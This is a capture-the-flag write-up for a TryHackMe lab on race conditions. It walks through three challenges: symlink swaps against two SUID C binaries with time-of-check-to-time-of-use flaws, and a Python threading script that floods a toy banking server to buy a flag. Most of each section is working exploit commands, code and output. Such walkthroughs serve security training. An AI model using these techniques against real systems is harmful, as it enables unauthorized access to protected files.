---
title: TryHackMe - Race Conditions
author: 0
date: 2023-06-15 16:00:00 +0800
categories: [thm, machine]
tags: [race-condition]
render_with_liquid: false
---

> Knock knock! Race condition. Who's there?

>In the home directories of Walk, Run and Sprint you will find a vulnerable SUID binary, the C source code and a flag. Your task is to exploit the binary to read the contents of the user's flag.
>The challenges are independent of each other and can be done in whatever order you want. It is, however, recommended to start with Walk.

## Flag 1 - Walk

We start looking in the /home/walk directory as instructed. We find the flag, but we don't have permissions to read it.

```bash
race@car:/home/walk$ ls -lah
total 44K
drwxr-xr-x 2 walk walk 4.0K Mar 27 19:14 .
drwxr-xr-x 6 root root 4.0K Mar 27 12:29 ..
-rwsr-sr-x 1 walk walk  16K Mar 27 19:14 anti_flag_reader
-rw-r--r-- 1 walk walk 1.1K Mar 27 19:10 anti_flag_reader.c
-rw-r--r-- 1 walk walk  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 walk walk 3.7K Jan  6  2022 .bashrc
-rw------- 1 walk walk   41 Mar 27 12:41 flag
-rw-r--r-- 1 walk walk  807 Jan  6  2022 .profile
race@car:/home/walk$ cat flag
cat: flag: Permission denied
```

We find a c progam that prints out files provided through arguments but it checks if the linked file is the `flag` or a symbolic link to avoid leaking the flag.

```c
race@car:/home/walk$ cat anti_flag_reader.c
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp) {

    int n;
    char buf[1024];
    struct stat lstat_buf;

    if (argc != 2) {
        puts("Usage: anti_flag_reader <FILE>");
        return 1;
    }
    
    puts("Checking if 'flag' is in the provided file path...");
    int path_check = strstr(argv[1], "flag");
    puts("Checking if the file is a symlink...");
    lstat(argv[1], &lstat_buf);
    int symlink_check = (S_ISLNK(lstat_buf.st_mode));
    puts("<Press Enter to continue>");
    getchar();
    
    if (path_check || symlink_check) {
        puts("Nice try, but I refuse to give you the flag!");
        return 1;
    } else {
        puts("This file can't possibly be the flag. I'll print it out for you:\n");
        int fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    }
    
    return 0;
}
```

When we run the c program, we won't get the flag

```bash
race@car:/home/walk$ ./anti_flag_reader flag
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>

Nice try, but I refuse to give you the flag!
```

We notice there is a moment where we have to press enter, after the checks are being done, which allows us to perform a race condition.

1. We run a second SSH terminal where we create a file that contains some text, which we will later use as a symbolic link to the flag
    ```bash
    race@car:~$ echo init > link
    ```
2. We run the program but don't press enter
    ```bash
    race@car:~$ ../walk/anti_flag_reader link
    Checking if 'flag' is in the provided file path...
    Checking if the file is a symlink...
    <Press Enter to continue>
    ```
3. We overwrite the `link` file with a symbolic link to the flag file, now that the checks already have been executed.
    ```bash
    race@car:~$ ln -sf ../walk/flag link
    ```
4. We press enter, and get the flag
    ```bash
    Checking if 'flag' is in the provided file path...
    Checking if the file is a symlink...
    <Press Enter to continue>

    This file can't possibly be the flag. I'll print it out for you:

    THM{R4**REDACTED**m!}
    ```

## Flag 2 - Run
When we check the run directory we find a program called `cat2`. We notice this program checks if the the user accessing the file in the argument is the owner of that file.

```c
race@car:/home/run$ cat cat2.c
#include <stdio.h>
#include <unistd.h>
#include <assert.h>

int main(int argc, char **argv, char **envp) {

    int fd;
    int n;
    int context; 
    char buf[1024];

    if (argc != 2) {
        puts("Usage: cat2 <FILE>");
        return 1;
    }

    puts("Welcome to cat2!");
    puts("This program is a side project I've been working on to be a more secure version of the popular cat command");
    puts("Unlike cat, the cat2 command performs additional checks on the user's security context");
    puts("This allows the command to be security compliant even if executed with SUID permissions!\n");
    puts("Checking the user's security context...");
    context = check_security_contex(argv[1]);
    puts("Context has been checked, proceeding!\n");

    if (context == 0) {
        puts("The user has access, outputting file...\n");
        fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    } else {
        puts("[SECURITY BREACH] The user does not have access to this file!");
        puts("Terminating...");
        return 1;
    }
    
    return 0;
}

int check_security_contex(char *file_name) {

    int context_result;

    context_result = access(file_name, R_OK);
    usleep(500);

    return context_result;
}
```


We can exploit this race condition by creating a loop that will constantly switch from linking to a file we created and the flag file and start it in the background. Afterwards, we run the program that can access the flag in a loop so it constantly runs the program. 

We are hoping on the perfect timing where:
1. The symbolic link is linked to our own file called `myfile`
2. `cat2` checks if we are the owner to that file, which we are
3. The symbolic link gets overwritten to the `/home/run/flag` file
3. Once `cat2` outputs the file, it accesses it again and prints out the `/home/run/flag` file

### Output

```bash
race@car:~$ while true; do ln -sf /home/run/flag link; ln -sf myfile link; done &
[1] 1040
race@car:/home/run$ while true; do ./cat2 /home/race/link; done
Welcome to cat2!
This program is a side project I've been working on to be a more secure version of the popular cat command
Unlike cat, the cat2 command performs additional checks on the user's security context
This allows the command to be security compliant even if executed with SUID permissions!

Checking the user's security context...
Context has been checked, proceeding!

The user has access, outputting file...

...

[SECURITY BREACH] The user does not have access to this file!
Terminating...
Welcome to cat2!
This program is a side project I've been working on to be a more secure version of the popular cat command
Unlike cat, the cat2 command performs additional checks on the user's security context
This allows the command to be security compliant even if executed with SUID permissions!

Checking the user's security context...
Context has been checked, proceeding!

The user has access, outputting file...

THM{R4**REDACTED**k5}
```

## Flag 3 -  Sprint
When we check the run directory we find a program called `bankingsystem.c`. It starts a server that listens on port 1337 for the commands: 'deposit', 'withdraw' and 'purchase flag'. The flag can be purchased for 15000. There is one caveat, the `money` variable is set to 0 each time a command has been processed. Therefore, it is impossible to accumulate enough funds to purchase the flag.


```c
race@car:/home/sprint$ cat bankingsystem.c
...

int money;

void *run_thread(void *ptr) {

    long addr;
    char *buffer;
    int buffer_len = 1024;
    char balance[512];
    int balance_length;
    connection_t *conn;

    if (!ptr) pthread_exit(0);

    conn = (connection_t *)ptr;
    addr = (long)((struct sockaddr_in *) &conn->address)->sin_addr.s_addr;
    buffer = malloc(buffer_len + 1);
    buffer[buffer_len] = 0;
    
    read(conn->sock, buffer, buffer_len);
    
    if (strstr(buffer, "deposit")) {
        money += 10000;
    } else if (strstr(buffer, "withdraw")) {
        money -= 10000;
    } else if (strstr(buffer, "purchase flag")) {
        if (money >= 15000) {
            sendfile(conn->sock, open("/home/sprint/flag", O_RDONLY), 0, 128);
            money -= 15000;
        } else {
            write(conn->sock, "Sorry, you don't have enough money to purchase the flag\n", 56);
        }
    }

    balance_length = snprintf(balance, 1024, "Current balance: %d\n", money);
    write(conn->sock, balance, balance_length);
    
    usleep(1);
    money = 0;
    
    close(conn->sock);
    free(buffer);
    free(conn);
    
    pthread_exit(0);
}

...

```

By performing a race condition, we can send multiple requests at once to deposit money, and purchase the flag before the `money` variable will be set to 0.

We can use the `threading` module in python. This code creates a specified number of threads to send deposit requests and purchase requests concurrently. Each deposit and purchase request is sent in a separate thread. After starting all the threads, the program waits for all of them to finish their execution before proceeding further.

- `thread.start()` is used to initiate the execution of a thread, allowing it to run concurrently with other threads in the program.
- `thread.join()` is used to wait for a thread to complete its execution before allowing the program to proceed further, ensuring synchronization between threads.

```python
import socket
import threading
import sys
import os

def send_request(url, command):
    host = url  # Replace with the actual server IP address
    port = 1337  # Replace with the actual server port

    try:
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the server
        client_socket.connect((host, port))

        # Send the command to the server
        client_socket.sendall(command.encode())

        # Receive and print the server response
        response = client_socket.recv(1024).decode()
        print(response)
        # When the flag has been found, exit the program
        if "THM" in response:
            os._exit(1)
    except ConnectionRefusedError:
        print(f'Connection refused. Make sure the server is running on {host}:{port}')
    except Exception as e:
        print(f'An error occurred: {str(e)}')

    finally:
        # Close the socket
        client_socket.close()

if __name__ == '__main__':
    url = sys.argv[1]
    num_requests = 1000  # Number of deposit requests to send
    deposit = 'deposit'
    flag = 'purchase flag'

    threads = []

    for i in range(num_requests):
        # Create and start threads for sending deposit requests
        t_deposit = threading.Thread(target=send_request, args=(url, deposit))
        threads.append(t_deposit)
        t_deposit.start()

        # Create and start threads for purchase requests
        t_purchase = threading.Thread(target=send_request, args=(url, flag))
        threads.append(t_purchase)
        t_purchase.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
```

### Output

```bash
$ python3 exploit.py 10.10.104.9
Current balance: 10000

Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Sorry, you don't have enough money to purchase the flag
Current balance: 0
Current balance: 10000
Current balance: 10000
Sorry, you don't have enough money to purchase the flag
Current balance: 20000
...
Sorry, you don't have enough money to purchase the flag
Sorry, you don't have enough money to purchase the flag
Current balance: 10000
Sorry, you don't have enough money to purchase the flag
Current balance: 0
THM{R4**REDACTED**$$}
Current balance: 15000
```